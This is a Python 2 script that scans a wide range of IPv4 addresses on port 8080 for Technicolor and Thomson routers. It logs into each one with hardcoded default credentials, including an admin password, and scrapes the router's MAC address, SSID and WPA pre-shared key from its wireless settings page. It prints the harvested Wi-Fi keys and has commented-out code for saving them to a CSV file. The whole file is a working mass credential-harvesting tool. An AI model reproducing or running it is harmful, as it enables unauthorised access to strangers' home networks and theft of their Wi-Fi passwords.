# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket


tech = 0
tom = 0

router = open('db.csv','a+')
for i in range(180,256):
    i = i + 1
    c = str(i)
    for j in range(49,256):
        j = j + 1
        l=str(j)
        for p in range(0,256):
            p = p + 1
            m = str(p)
            for a in range(0,256):
                a = a + 1
                g = str(a)
                h = c + "." + l + "." + m + "." + g
                try:
                    r1 = requests.get('http://'+str(h)+':8080/', timeout=0.3)
                    head = r1.headers
                    b = 'WWW-Authenticate' in head
                    if b==True:
                        thom = 'Basic realm="Thomson"'
                        techni = 'Basic realm="Technicolor"'
                        
                        r = requests.get('http://'+h+':8080/', timeout=0.3)
                        n = r.headers['WWW-Authenticate']
                        if n == techni: ##Technicolor
                            tech = tech+1
                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('user', 'pass'), timeout=0.4)
                            parser1 = r2.content
                            
                            bs1 = BeautifulSoup(parser1, "html.parser")
                            
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                
                                for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    #router.write(h+','+'Technicolor'+','+str(td.text[16:])+','+str(pwd["value"])+','+'\n')
                                    print h+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
                        elif n==thom: ##Thomson
                            tom = tom+1
                            r3 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            r4 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
                            parser = r4.content
                            bs1 = BeautifulSoup(parser, "html.parser")
                            
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    #router.write(h+','+'Thomson'+','+str(t.text[16:])+','+str(pws["value"])+','+'\n')
                                    print h+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
                        
                                    
                except requests.exceptions.Timeout:
                    pass
                except KeyError:
                    pass
                except socket.timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                
router.close()
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"

    
